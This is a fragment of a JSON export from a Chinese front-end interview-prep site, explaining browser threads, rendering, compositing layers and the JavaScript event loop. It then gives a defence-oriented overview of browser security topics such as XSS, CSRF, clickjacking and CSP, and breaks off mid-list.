\n\n这里绘一张简单的图：（很简化）\n\n![](https://static.ecool.fun//article/8673801e-647f-4363-9e56-29b2e208139a.awebp)\n\n看完这一整套流程，应该对浏览器的运作有了一定理解了，这样有了知识架构的基础后，后续就方便往上填充内容。\n\n这块再往深处讲的话就涉及到浏览器内核源码解析了，不属于本文范围。\n\n如果这一块要深挖，建议去读一些浏览器内核源码解析文章，或者可以先看看参考下来源中的第一篇文章，写的不错\n\n## 梳理浏览器内核中线程之间的关系\n\n到了这里，已经对浏览器的运行有了一个整体的概念，接下来，先简单梳理一些概念\n\n### GUI渲染线程与JS引擎线程互斥\n\n由于JavaScript是可操纵DOM的，如果在修改这些元素属性同时渲染界面（即JS线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致了。\n\n因此为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS引擎为互斥的关系，当JS引擎执行时GUI线程会被挂起， GUI更新则会被保存在一个队列中等到JS引擎线程空闲时立即被执行。\n\n### JS阻塞页面加载\n\n从上述的互斥关系，可以推导出，JS如果执行时间过长就会阻塞页面。\n\n譬如，假设JS引擎正在进行巨量的计算，此时就算GUI有更新，也会被保存到队列中，等待JS引擎空闲后执行。 然后，由于巨量计算，所以JS引擎很可能很久很久后才能空闲，自然会感觉到巨卡无比。\n\n所以，要尽量避免JS执行时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉。\n\n### WebWorker，JS的多线程？\n\n前文中有提到JS引擎是单线程的，而且JS执行时间过长会阻塞页面，那么JS就真的对cpu密集型计算无能为力么？\n\n所以，后来HTML5中支持了`Web Worker`。\n\nMDN的官方解释是：\n\n```js\nWeb Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面\n\n一个worker是使用一个构造函数创建的一个对象(e.g. Worker()) 运行一个命名的JavaScript文件 \n\n这个文件包含将在工作线程中运行的代码; workers 运行在另一个全局上下文中,不同于当前的window\n\n因此，使用 window快捷方式获取当前全局的范围 (而不是self) 在一个 Worker 内将返回错误\n```\n\n这样理解下：\n\n-   创建Worker时，JS引擎向浏览器申请开一个子线程（子线程是浏览器开的，完全受主线程控制，而且不能操作DOM）\n    \n-   JS引擎线程与worker线程间通过特定的方式通信（postMessage API，需要通过序列化对象来与线程交互特定的数据）\n    \n\n所以，如果有非常耗时的工作，请单独开一个Worker线程，这样里面不管如何翻天覆地都不会影响JS引擎主线程， 只待计算出结果后，将结果通信给主线程即可，perfect!\n\n而且注意下，**JS引擎是单线程的**，这一点的本质仍然未改变，Worker可以理解是浏览器给JS引擎开的外挂，专门用来解决那些大量计算问题。\n\n其它，关于Worker的详解就不是本文的范畴了，因此不再赘述。\n\n### WebWorker与SharedWorker\n\n既然都到了这里，就再提一下`SharedWorker`（避免后续将这两个概念搞混）\n\n-   WebWorker只属于某个页面，不会和其他页面的Render进程（浏览器内核进程）共享\n    \n    -   所以Chrome在Render进程中（每一个Tab页就是一个render进程）创建一个新的线程来运行Worker中的JavaScript程序。\n-   SharedWorker是浏览器所有页面共享的，不能采用与Worker同样的方式实现，因为它不隶属于某个Render进程，可以为多个Render进程共享使用\n    \n    -   所以Chrome浏览器为SharedWorker单独创建一个进程来运行JavaScript程序，在浏览器中每个相同的JavaScript只存在一个SharedWorker进程，不管它被创建多少次。\n\n看到这里，应该就很容易明白了，本质上就是进程和线程的区别。SharedWorker由独立的进程管理，WebWorker只是属于render进程下的一个线程\n\n## 简单梳理下浏览器渲染流程\n\n本来是直接计划开始谈JS运行机制的，但想了想，既然上述都一直在谈浏览器，直接跳到JS可能再突兀，因此，中间再补充下浏览器的渲染流程（简单版本）\n\n为了简化理解，前期工作直接省略成：（要展开的或完全可以写另一篇超长文）\n\n```js\n- 浏览器输入url，浏览器主进程接管，开一个下载线程，\n然后进行 http请求（略去DNS查询，IP寻址等等操作），然后等待响应，获取内容，\n随后将内容通过RendererHost接口转交给Renderer进程\n\n- 浏览器渲染流程开始\n```\n\n浏览器器内核拿到内容后，渲染大概可以划分成以下几个步骤：\n\n1.  解析html建立dom树\n    \n2.  解析css构建render树（将CSS代码解析成树形的数据结构，然后结合DOM合并成render树）\n    \n3.  布局render树（Layout/reflow），负责各元素尺寸、位置的计算\n    \n4.  绘制render树（paint），绘制页面像素信息\n    \n5.  浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上。\n    \n\n所有详细步骤都已经略去，渲染完毕后就是`load`事件了，之后就是自己的JS逻辑处理了\n\n既然略去了一些详细的步骤，那么就提一些可能需要注意的细节把。\n\n这里重绘参考来源中的一张图：（参考来源第一篇）\n\n![](https://static.ecool.fun//article/baccc8ff-8d13-4911-a28c-9fff3ebbe7fb.awebp)\n\n### load事件与DOMContentLoaded事件的先后\n\n上面提到，渲染完毕后会触发`load`事件，那么你能分清楚`load`事件与`DOMContentLoaded`事件的先后么？\n\n很简单，知道它们的定义就可以了：\n\n-   当 DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片。 (譬如如果有async加载的脚本就不一定完成)\n    \n-   当 onload 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了。 （渲染完毕了）\n    \n\n所以，顺序是：`DOMContentLoaded -> load`\n\n### css加载是否会阻塞dom树渲染？\n\n这里说的是头部引入css的情况\n\n首先，我们都知道：**css是由单独的下载线程异步下载的。**\n\n然后再说下几个现象：\n\n-   css加载不会阻塞DOM树解析（异步加载时DOM照常构建）\n    \n-   但会阻塞render树渲染（渲染时需等css加载完毕，因为render树需要css信息）\n    \n\n这可能也是浏览器的一种优化机制。\n\n因为你加载css的时候，可能会修改下面DOM节点的样式， 如果css加载不阻塞render树渲染的话，那么当css加载完之后， render树可能又得重新重绘或者回流了，这就造成了一些没有必要的损耗。 所以干脆就先把DOM树的结构先解析完，把可以做的工作做完，然后等你css加载完之后， 在根据最终的样式来渲染render树，这种做法性能方面确实会比较好一点。\n\n### 普通图层和复合图层\n\n渲染步骤中就提到了`composite`概念。\n\n可以简单的这样理解，浏览器渲染的图层一般包含两大类：`普通图层`以及`复合图层`\n\n首先，普通文档流内可以理解为一个复合图层（这里称为`默认复合层`，里面不管添加多少元素，其实都是在同一个复合图层中）\n\n其次，absolute布局（fixed也一样），虽然可以脱离普通文档流，但它仍然属于`默认复合层`。\n\n然后，可以通过`硬件加速`的方式，声明一个`新的复合图层`，它会单独分配资源 （当然也会脱离普通文档流，这样一来，不管这个复合图层中怎么变化，也不会影响`默认复合层`里的回流重绘）\n\n可以简单理解下：**GPU中，各个复合图层是单独绘制的，所以互不影响**，这也是为什么某些场景硬件加速效果一级棒\n\n可以`Chrome源码调试 -> More Tools -> Rendering -> Layer borders`中看到，黄色的就是复合图层信息\n\n如下图。可以验证上述的说法\n\n![](https://static.ecool.fun//article/e766c1c8-40a7-425f-a63b-e45e873ff357.awebp)\n\n**如何变成复合图层（硬件加速）**\n\n将该元素变成一个复合图层，就是传说中的硬件加速技术\n\n-   最常用的方式：`translate3d`、`translateZ`\n    \n-   `opacity`属性/过渡动画（需要动画执行的过程中才会创建合成层，动画没有开始或结束后元素还会回到之前的状态）\n    \n-   `will-chang`属性（这个比较偏僻），一般配合opacity与translate使用（而且经测试，除了上述可以引发硬件加速的属性外，其它属性并不会变成复合层）， 作用是提前告诉浏览器要变化，这样浏览器会开始做一些优化工作（这个最好用完后就释放）\n    \n-   `<video><iframe><canvas><webgl>`等元素\n    \n-   其它，譬如以前的flash插件\n    \n\n**absolute和硬件加速的区别**\n\n可以看到，absolute虽然可以脱离普通文档流，但是无法脱离默认复合层。 所以，就算absolute中信息改变时不会改变普通文档流中render树， 但是，浏览器最终绘制时，是整个复合层绘制的，所以absolute中信息的改变，仍然会影响整个复合层的绘制。 （浏览器会重绘它，如果复合层中内容多，absolute带来的绘制信息变化过大，资源消耗是非常严重的）\n\n而硬件加速直接就是在另一个复合层了（另起炉灶），所以它的信息改变不会影响默认复合层 （当然了，内部肯定会影响属于自己的复合层），仅仅是引发最后的合成（输出视图）\n\n**复合图层的作用？**\n\n一般一个元素开启硬件加速后会变成复合图层，可以独立于普通文档流中，改动后可以避免整个页面重绘，提升性能\n\n但是尽量不要大量使用复合图层，否则由于资源消耗过度，页面反而会变的更卡\n\n**硬件加速时请使用index**\n\n使用硬件加速时，尽可能的使用index，防止浏览器默认给后续的元素创建复合层渲染\n\n具体的原理时这样的： **webkit CSS3中，如果这个元素添加了硬件加速，并且index层级比较低， 那么在这个元素的后面其它元素（层级比这个元素高的，或者相同的，并且releative或absolute属性相同的）， 会默认变为复合层渲染，如果处理不当会极大的影响性能**\n\n简单点理解，其实可以认为是一个隐式合成的概念：**如果a是一个复合图层，而且b在a上面，那么b也会被隐式转为一个复合图层**，这点需要特别注意\n\n另外，这个问题可以在这个地址看到重现（原作者分析的挺到位的，直接上链接）：\n\n[web.jobbole.com/83575/](http://web.jobbole.com/83575/ \"http://web.jobbole.com/83575/\")\n\n## 从Event Loop谈JS的运行机制\n\n到此时，已经是属于浏览器页面初次渲染完毕后的事情，JS引擎的一些运行机制分析。\n\n注意，这里不谈`可执行上下文`，`VO`，`scop chain`等概念（这些完全可以整理成另一篇文章了），这里主要是结合`Event Loop`来谈JS代码是如何执行的。\n\n读这部分的前提是已经知道了JS引擎是单线程，而且这里会用到上文中的几个概念：（如果不是很理解，可以回头温习）\n\n-   JS引擎线程\n    \n-   事件触发线程\n    \n-   定时触发器线程\n    \n\n然后再理解一个概念：\n\n-   JS分为同步任务和异步任务\n    \n-   同步任务都在主线程上执行，形成一个`执行栈`\n    \n-   主线程之外，**事件触发线程**管理着一个`任务队列`，只要异步任务有了运行结果，就在`任务队列`之中放置一个事件。\n    \n-   一旦`执行栈`中的所有同步任务执行完毕（此时JS引擎空闲），系统就会读取`任务队列`，将可运行的异步任务添加到可执行栈中，开始执行。\n    \n\n看图：\n\n![](https://static.ecool.fun//article/a47cb5dc-fc50-4c77-af20-e103243d68e6.awebp)\n\n看到这里，应该就可以理解了：为什么有时候setTimeout推入的事件不能准时执行？因为可能在它推入到事件列表时，主线程还不空闲，正在执行其它代码， 所以自然有误差。\n\n### 事件循环机制进一步补充\n\n这里就直接引用一张图片来协助理解：（参考自Philip Roberts的演讲《[Help, I'm stuck in an event-loop](http://vimeo.com/96425312 \"http://vimeo.com/96425312\")》）\n\n![](https://static.ecool.fun//article/6bd6c0eb-ff6a-44b9-bf88-488482ffdf01.awebp)\n\n上图大致描述就是：\n\n-   主线程运行时会产生执行栈， 栈中的代码调用某些api时，它们会在事件队列中添加各种事件（当满足触发条件后，如ajax请求完毕）\n    \n-   而栈中的代码执行完毕，就会读取事件队列中的事件，去执行那些回调\n    \n-   如此循环\n    \n-   注意，总是要等待栈中的代码执行完毕后才会去读取事件队列中的事件\n    \n\n### 单独说说定时器\n\n上述事件循环机制的核心是：JS引擎线程和事件触发线程\n\n但事件上，里面还有一些隐藏细节，譬如调用`setTimeout`后，是如何等待特定时间后才添加到事件队列中的？\n\n是JS引擎检测的么？当然不是了。它是由**定时器线程**控制（因为JS引擎自己都忙不过来，根本无暇分身）\n\n为什么要单独的定时器线程？因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确，因此很有必要单独开一个线程用来计时。\n\n什么时候会用到定时器线程？**当使用`setTimeout`或`setInterval`时**，它需要定时器线程计时，计时完成后就会将特定的事件推入事件队列中。\n\n譬如:\n\n```js\nsetTimeout(function(){\n    console.log('hello!');\n}, 1000);\n```\n\n这段代码的作用是当`1000`毫秒计时完毕后（由定时器线程计时），将回调函数推入事件队列中，等待主线程执行\n\n```js\nsetTimeout(function(){\n    console.log('hello!');\n}, 0);\n\nconsole.log('begin');\n```\n\n这段代码的效果是最快的时间内将回调函数推入事件队列中，等待主线程执行\n\n注意：\n\n-   执行结果是：先`begin`后`hello!`\n    \n-   虽然代码的本意是0毫秒后就推入事件队列，但是W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。 (不过也有一说是不同浏览器有不同的最小时间设定)\n    \n-   就算不等待4ms，就算假设0毫秒就推入事件队列，也会先执行`begin`（因为只有可执行栈内空了后才会主动读取事件队列）\n    \n\n### setTimeout而不是setInterval\n\n用setTimeout模拟定期计时和直接用setInterval是有区别的。\n\n因为每次setTimeout计时到后就会去执行，然后执行一段时间后才会继续setTimeout，中间就多了误差 （误差多少与代码执行时间有关）\n\n而setInterval则是每次都精确的隔一段时间推入一个事件 （但是，事件的实际执行时间不一定就准确，还有可能是这个事件还没执行完毕，下一个事件就来了）\n\n而且setInterval有一些比较致命的问题就是：\n\n-   累计效应（上面提到的），如果setInterval代码在（setInterval）再次添加到队列之前还没有完成执行， 就会导致定时器代码连续运行好几次，而之间没有间隔。 就算正常间隔执行，多个setInterval的代码执行时间可能会比预期小（因为代码执行需要一定时间）\n    \n-   ~譬如像iOS的webview,或者Safari等浏览器中都有一个特点，**在滚动的时候是不执行JS的**，如果使用了setInterval，会发现在滚动结束后会执行多次由于滚动不执行JS积攒回调，如果回调执行时间过长,就会非常容器造成卡顿问题和一些不可知的错误~（这一块后续有补充，setInterval自带的优化，不会重复添加回调）\n    \n-   而且把浏览器最小化显示等操作时，setInterval并不是不执行程序， 它会把setInterval的回调函数放在队列中，等浏览器窗口再次打开时，一瞬间全部执行时\n    \n\n所以，鉴于这么多但问题，目前一般认为的最佳方案是：**用setTimeout模拟setInterval，或者特殊场合直接用requestAnimationFrame**\n\n**补充：JS高程中有提到，JS引擎会对setInterval进行优化，如果当前事件队列中有setInterval的回调，不会重复添加。不过，仍然是有很多问题。。。**\n\n## 事件循环进阶：macrotask与microtask\n\n这段参考了参考来源中的第2篇文章（英文版的），（加了下自己的理解重新描述了下）， 强烈推荐有英文基础的同学直接观看原文，作者描述的很清晰，示例也很不错，如下：\n\n[jakearchibald.com/2015/tasks-…](https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/ \"https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/\")\n\n上文中将JS事件循环机制梳理了一遍，在ES5的情况是够用了，但是在ES6盛行的现在，仍然会遇到一些问题，譬如下面这题：\n\n```js\nconsole.log('script start');\n\nsetTimeout(function() {\n    console.log('setTimeout');\n}, 0);\n\nPromise.resolve().then(function() {\n    console.log('promise1');\n}).then(function() {\n    console.log('promise2');\n});\n\nconsole.log('script end');\n```\n\n嗯哼，它的正确执行顺序是这样子的：\n\n```js\nscript start\nscript end\npromise1\npromise2\nsetTimeout\n```\n\n为什么呢？因为Promise里有了一个一个新的概念：`microtask`\n\n或者，进一步，JS中分为两种任务类型：**`macrotask`和`microtask`**，在ECMAScript中，microtask称为`jobs`，macrotask可称为`task`\n\n它们的定义？区别？简单点可以按如下理解：\n\n-   macrotask（又称之为宏任务），可以理解是每次执行栈执行的代码就是一个宏任务（包括每次从事件队列中获取一个事件回调并放到执行栈中执行）\n    \n    -   每一个task会从头到尾将这个任务执行完毕，不会执行其它\n        \n    -   浏览器为了能够使得JS内部task与DOM任务能够有序的执行，会在一个task执行结束后，在下一个 task 执行开始前，对页面进行重新渲染 （`task->渲染->task->...`）\n        \n-   microtask（又称为微任务），可以理解是在当前 task 执行结束后立即执行的任务\n    \n    -   也就是说，在当前task任务后，下一个task之前，在渲染之前\n        \n    -   所以它的响应速度相比setTimeout（setTimeout是task）会更快，因为无需等渲染\n        \n    -   也就是说，在某一个macrotask执行完后，就会将在它执行期间产生的所有microtask都执行完毕（在渲染前）\n        \n\n分别很么样的场景会形成macrotask和microtask呢？\n\n-   macrotask：主代码块，setTimeout，setInterval等（可以看到，事件队列中的每一个事件都是一个macrotask）\n    \n-   microtask：Promise，process.nextTick等\n    \n\n**补充：在node环境下，process.nextTick的优先级高于Promise**，也就是可以简单理解为：在宏任务结束后会先执行微任务队列中的nextTickQueue部分，然后才会执行微任务中的Promise部分。\n\n参考：[segmentfault.com/q/101000001…](https://segmentfault.com/q/1010000011914016 \"https://segmentfault.com/q/1010000011914016\")\n\n再根据线程来理解下：\n\n-   macrotask中的事件都是放在一个事件队列中的，而这个队列由**事件触发线程**维护\n    \n-   microtask中的所有微任务都是添加到微任务队列（Job Queues）中，等待当前macrotask执行完毕后执行，而这个队列由**JS引擎线程维护** （这点由自己理解+推测得出，因为它是在主线程下无缝执行的）\n    \n\n所以，总结下运行机制：\n\n-   执行一个宏任务（栈中没有就从事件队列中获取）\n    \n-   执行过程中如果遇到微任务，就将它添加到微任务的任务队列中\n    \n-   宏任务执行完毕后，立即执行当前微任务队列中的所有微任务（依次执行）\n    \n-   当前宏任务执行完毕，开始检查渲染，然后GUI线程接管渲染\n    \n-   渲染完毕后，JS线程继续接管，开始下一个宏任务（从事件队列中获取）\n    \n\n如图：\n\n![](https://static.ecool.fun//article/415e1f34-7727-4645-b7bd-7f9e308ea618.awebp)\n\n另外，请注意下`Promise`的`polyfill`与官方版本的区别：\n\n-   官方版本中，是标准的microtask形式\n    \n-   polyfill，一般都是通过setTimeout模拟的，所以是macrotask形式\n    \n-   请特别注意这两点区别\n    \n\n注意，有一些浏览器执行结果不一样（因为它们可能把microtask当成macrotask来执行了）， 但是为了简单，这里不描述一些不标准的浏览器下的场景（但记住，有些浏览器可能并不标准）\n\n**20180126补充：使用MutationObserver实现microtask**\n\nMutationObserver可以用来实现microtask （它属于microtask，优先级小于Promise， 一般是Promise不支持时才会这样做）\n\n它是HTML5中的新特性，作用是：监听一个DOM变动， 当DOM对象树发生任何变动时，Mutation Observer会得到通知\n\n像以前的Vue源码中就是利用它来模拟nextTick的， 具体原理是，创建一个TextNode并监听内容变化， 然后要nextTick的时候去改一下这个节点的文本内容， 如下：（Vue的源码，未修改）\n\n```js\nvar counter = 1\nvar observer = new MutationObserver(nextTickHandler)\nvar textNode = document.createTextNode(String(counter))\n\nobserver.observe(textNode, {\n    characterData: true\n})\ntimerFunc = () => {\n    counter = (counter + 1) % 2\n    textNode.data = String(counter)\n}\n```\n\n[对应Vue源码链接](https://github.com/vuejs/vue/blob/9cfd63a7d08c1eba029c8bd7463b3047c3347826/src/core/util/env.js#L86-L95 \"https://github.com/vuejs/vue/blob/9cfd63a7d08c1eba029c8bd7463b3047c3347826/src/core/util/env.js#L86-L95\")\n\n不过，现在的Vue（2.5+）的nextTick实现移除了MutationObserver的方式（据说是兼容性原因）， 取而代之的是使用MessageChannel （当然，默认情况仍然是Promise，不支持才兼容的）。\n\nMessageChannel属于宏任务，优先级是：`MessageChannel->setTimeout`， 所以Vue（2.5+）内部的nextTick与2.4及之前的实现是不一样的，需要注意下。\n\n这里不展开，可以看下[juejin.cn/post/684490…](https://juejin.cn/post/6844903516822044680 \"https://juejin.cn/post/6844903516822044680\")\n\n## 写在最后的话\n\n看到这里，不知道对JS的运行机制是不是更加理解了，从头到尾梳理，而不是就某一个碎片化知识应该是会更清晰的吧？\n\n同时，也应该注意到了JS根本就没有想象的那么简单，前端的知识也是无穷无尽，层出不穷的概念、N多易忘的知识点、各式各样的框架、 底层原理方面也是可以无限的往下深挖，然后你就会发现，你知道的太少了。。。",
    "testPoint": "浏览器的进程和线程相关的常见考点包括：\n\n1. **浏览器的多进程架构**  \n   - **主进程（Browser Process）**：负责浏览器的UI界面、标签页管理、地址栏、书签等任务。  \n   - **渲染进程（Renderer Process）**：每个标签页通常由一个独立的渲染进程处理，负责解析HTML、CSS、JavaScript，生成DOM树、CSSOM树和渲染树。  \n   - **GPU进程**：负责图形渲染（如Canvas、WebGL）以及硬件加速。  \n   - **插件进程**：如果使用插件（如Flash），会为插件分配独立进程。  \n   - **网络进程**：负责处理网络请求和响应。  \n   - **浏览器进程与渲染进程的关系**：浏览器进程负责管理多个渲染进程，渲染进程独立运行，彼此之间相对隔离，提升安全性和稳定性。  \n\n2. **多进程带来的优势**  \n   - **稳定性**：一个进程崩溃不会影响其他进程，避免整个浏览器崩溃。  \n   - **安全性**：进程间隔离，降低恶意脚本影响的范围。  \n   - **性能**：利用多核处理器，渲染进程可以并行处理不同标签页。  \n   - **资源隔离**：不同进程拥有独立的内存和资源空间，避免资源冲突。\n\n3. **浏览器的单线程与多线程**  \n   - **JavaScript主线程**：浏览器的JavaScript引擎在单一线程中执行脚本，解析和执行JavaScript代码。  \n   - **UI线程与渲染线程**：渲染进程的UI线程负责页面渲染，包括计算布局、绘制、处理用户交互等。  \n   - **Web Worker**：允许JavaScript在后台线程执行，可以在不阻塞UI线程的情况下处理密集计算任务。  \n   - **事件循环（Event Loop）**：JavaScript单线程模型的核心机制，负责管理异步操作。  \n   - **浏览器的其他线程**：  \n     - **渲染线程**：负责页面渲染，包括布局、绘制、合成。  \n     - **定时器线程**：执行`setTimeout`、`setInterval`等定时操作。  \n     - **异步请求线程**：处理AJAX请求和Fetch API等。\n\n4. **浏览器进程和线程的通讯机制**  \n   - **IPC（进程间通信）**：进程之间通过IPC进行通信，浏览器进程与渲染进程、渲染进程与其他进程（如GPU进程、插件进程）之间的消息传递。  \n   - **消息传递**：通常使用序列化和反序列化技术（如JSON或二进制消息）进行跨进程数据传输。  \n   - **共享内存和映射文件**：某些情况下，浏览器会使用共享内存或映射文件来实现进程间的数据共享。\n\n5. **浏览器进程与线程的调度**  \n   - **操作系统调度**：浏览器进程和线程的调度由操作系统管理，浏览器在多个进程和线程之间进行任务分配。  \n   - **线程优先级**：浏览器会为不同的线程（如渲染线程、事件循环线程）设置不同的优先级，以优化性能。\n\n6. **渲染进程中的多线程**  \n   - **渲染线程内部的多线程**：渲染进程通常会创建多个线程来处理不同的任务，如：  \n     - **HTML解析线程**  \n     - **CSS解析线程**  \n     - **JavaScript执行线程**  \n     - **布局和绘制线程**  \n   - **合成线程**：负责将页面分成多个图层并将其合成到一起，最终呈现给用户。  \n\n7. **浏览器进程崩溃与恢复**  \n   - **进程崩溃保护**：当某个渲染进程崩溃时，浏览器通常会重启该进程而不会影响其他标签页或浏览器进程。  \n   - **进程重启与数据恢复**：一些浏览器能够在崩溃后恢复用户的数据、历史记录和打开的标签页。  \n\n8. **线程池与并发执行**  \n   - **线程池的应用**：浏览器可能会使用线程池来管理并发任务，尤其是在处理图片、视频解码、Web Worker等时。  \n   - **并发与并行**：浏览器通过多线程（如Web Worker）和多进程来并行处理多个任务，尤其是在多核处理器上，能够有效提升性能。\n\n9. **进程隔离的挑战与优化**  \n   - **性能开销**：多进程和进程间通信会带来额外的性能开销，如何在性能和安全性之间做平衡是浏览器设计的关键。  \n   - **内存管理**：多个进程和线程需要独立的内存管理，如何高效利用系统内存是一个重要的优化点。\n\n这些考点涵盖了浏览器中进程和线程的基本架构、相互关系、性能优化以及多进程架构带来的优势与挑战。",
    "exerciseKeyList": "[\"566e4e90-c81e-4fe0-82bc-27ca19b835e7\",\"fe257d38-7fa5-4062-bdc5-e11525b984a4\",\"6c221f8f-6a86-45f9-8141-59c21388c073\",\"d7d29afc-ce7b-480d-aab0-66f70b25ce46\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:19:00.000Z",
    "updateAt": "2025-08-07T11:50:06.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "566e4e90-c81e-4fe0-82bc-27ca19b835e7",
        "title": "进程、线程、协程分别是什么概念？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T00:04:53.000Z"
      },
      {
        "exerciseKey": "6c221f8f-6a86-45f9-8141-59c21388c073",
        "title": "进程与线程有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:36:19.000Z",
        "updateAt": "2021-07-07T00:12:15.000Z"
      },
      {
        "exerciseKey": "d7d29afc-ce7b-480d-aab0-66f70b25ce46",
        "title": "进程间有哪些通信方式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:37:28.000Z",
        "updateAt": "2021-07-07T00:12:17.000Z"
      },
      {
        "exerciseKey": "fe257d38-7fa5-4062-bdc5-e11525b984a4",
        "title": "谈谈你对浏览器中进程和线程的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-01T02:07:30.000Z",
        "updateAt": "2024-08-10T17:05:37.000Z"
      }
    ]
  },
  "221": {
    "id": 221,
    "tagId": 21,
    "title": "浏览器的安全性",
    "explanation": "浏览器安全性是前端开发中的重要考察点之一，主要指浏览器在访问网站过程中如何防止攻击者利用漏洞或机制实施攻击、窃取数据、破坏用户体验等。\n \n## 一、常见的浏览器安全威胁\n\n### 1. **XSS（跨站脚本攻击）**\n\n* 原理：攻击者注入恶意脚本到网页中，在用户浏览页面时执行。\n* 危害：窃取 cookie、伪造操作、传播蠕虫。\n* 防御：\n\n  * 对输出进行**HTML转义**；\n  * 使用 **Content Security Policy（CSP）**；\n  * 严格控制用户输入（白名单）；\n  * 使用框架自动防御（如 React 的 JSX 自动转义）。\n\n---\n\n### 2. **CSRF（跨站请求伪造）**\n\n* 原理：用户登录目标网站后，被诱导访问恶意链接，触发网站上的有状态请求。\n* 危害：修改密码、转账等敏感操作被伪造。\n* 防御：\n\n  * 使用 CSRF Token；\n  * Referer 验证；\n  * SameSite Cookie 属性限制第三方请求。\n\n---\n\n### 3. **点击劫持（Clickjacking）**\n\n* 原理：攻击者在页面上嵌入透明 iframe，引诱用户点击。\n* 防御：\n\n  * 禁止网页被嵌入 iframe：`X-Frame-Options: DENY / SAMEORIGIN`；\n  * 使用 CSP 中的 `frame-ancestors` 指定允许嵌入的来源。\n\n---\n\n### 4. **恶意文件上传**\n\n* 原理：上传可执行脚本，触发服务端或客户端执行。\n* 防御：\n\n  * 严格限制文件类型与大小；\n  * 不在上传目录下执行脚本；\n  * 设置 CDN 或存储桶只读访问权限。\n\n---\n\n### 5. **恶意第三方脚本（供应链攻击）**\n\n* 原理：攻击者污染 CDN 或依赖源，注入恶意代码。\n* 防御：\n\n  * 使用子资源完整性校验（Subresource Integrity, SRI）；\n  * 只信任可靠的依赖源；\n  * 上线前锁定依赖版本。\n\n---\n\n## 二、浏览器原生安全机制\n\n### 1. **同源策略（Same-Origin Policy）**\n\n* 限制不同源之间访问 Cookie、DOM、LocalStorage 等。\n* 同源指：协议、域名、端口号都相同。\n\n### 2. **CORS（跨域资源共享）**\n\n* 浏览器通过预检请求和响应头判断是否允许跨域访问。\n\n### 3. **Content Security Policy（CSP）**\n\n* 通过设置 HTTP Header 控制资源加载策略，防止 XSS 和数据泄露。\n* 示例：\n\n  ```http\n  Content-Security-Policy: default-src 'self'; script-src 'self' https://trust.cdn.com;\n  ```\n\n### 4. **HTTP-only & Secure Cookie**\n\n* `HttpOnly`: 防止 JavaScript 读取 Cookie；\n* `Secure`: 仅在 HTTPS 下传输 Cookie；\n* `SameSite`: 限制第三方请求携带 Cookie。\n\n### 5. **Sandbox（iframe 安全沙箱）**\n\n* `<iframe sandbox>` 属性限制 iframe 的行为；\n* 可防止脚本执行、表单提交等危险操作。\n\n---\n\n## 三、前端开发中的安全实践\n\n| 安全措施   | 说明                              |\n| ------ | ------------------------------- |\n| 输入校验   | 客户端和服务端都要做，优先使用白名单策略            |\n| 输出编码   | HTML、JavaScript、URL 编码避免 XSS 注入 |\n| HTTPS  | 加密传输防止中间人攻击（MITM）               |\n| 使用现代框架 | React/Vue/Angular 等框架天然防御 XSS   |\n| 限制权限   | 用户行为应严格授权与验证                    |\n| CSP 策略 | 强制资源加载来源、禁止内联脚本                 |\n\n---\n\n## 四、总结\n\n浏览器安全是前端必须掌握的重要基础知识，核心目标是 **防止前端受到攻击者控制或操纵**。它涉及浏览器机制、HTTP协议、安全头部、数据验证等多个维度，需要前端开发者在日常开发中养成良好安全意识与编码习惯。\n\n---\n\n如果你在准备面试，可从：\n\n* 常见攻击（XSS、CSRF）原理和防御；\n* 安全头（CSP、X-Frame-Options 等）；\n* 前端框架默认的安全特性；\n* HTTPS 与证书机制；\n  这些角度进行重点准备。\n\n需要我整理成 PDF 或 Markdown 文档也可以告诉我。\n",
    "testPoint": "浏览器安全性的相关考点包括：\n\n### 1. **浏览器安全模型**\n   - **同源策略（Same-Origin Policy）**：限制不同源之间的交互，保护数据安全。\n   - **跨域资源共享（CORS）**：安全地实现跨域资源访问。\n   - **Content Security Policy（CSP）**：防止XSS攻击和数据注入。\n   - **沙盒机制**：限制页面或插件的访问权限，隔离潜在的恶意代码。\n\n### 2. **常见安全攻击及防范**\n   - **跨站脚本攻击（XSS）**：\n     - 攻击类型：存储型、反射型、DOM型。\n     - 防御措施：编码输出、CSP、HTTP-only Cookies。\n   - **跨站请求伪造（CSRF）**：\n     - 攻击机制：伪造用户请求操作。\n     - 防御措施：CSRF Token、Referer验证、SameSite Cookie。\n   - **点击劫持（Clickjacking）**：\n     - 攻击机制：通过透明的iframe诱导用户点击。\n     - 防御措施：`X-Frame-Options`设置为`DENY`或`SAMEORIGIN`。\n   - **HTTP劫持**：\n     - 防御措施：HTTPS加密传输。\n   - **中间人攻击（MITM）**：\n     - 防御措施：使用TLS/SSL加密、启用HSTS。\n\n### 3. **浏览器安全特性**\n   - **HTTPS**：\n     - TLS/SSL加密，确保数据传输安全。\n   - **HSTS（HTTP Strict Transport Security）**：\n     - 强制使用HTTPS连接，避免降级攻击。\n   - **Secure和HttpOnly Cookies**：\n     - `HttpOnly`防止客户端脚本访问Cookie。\n     - `Secure`标记仅在HTTPS下传输Cookie。\n   - **SameSite Cookie**：\n     - 防止第三方Cookie被跨站点请求携带。\n\n### 4. **数据保护**\n   - **敏感信息保护**：\n     - 避免在浏览器存储中保存明文敏感数据。\n   - **Web存储安全**：\n     - 防止LocalStorage、SessionStorage被恶意脚本读取。\n   - **隐私保护**：\n     - 防止用户行为数据被追踪。\n\n### 5. **浏览器安全机制**\n   - **进程隔离**：\n     - 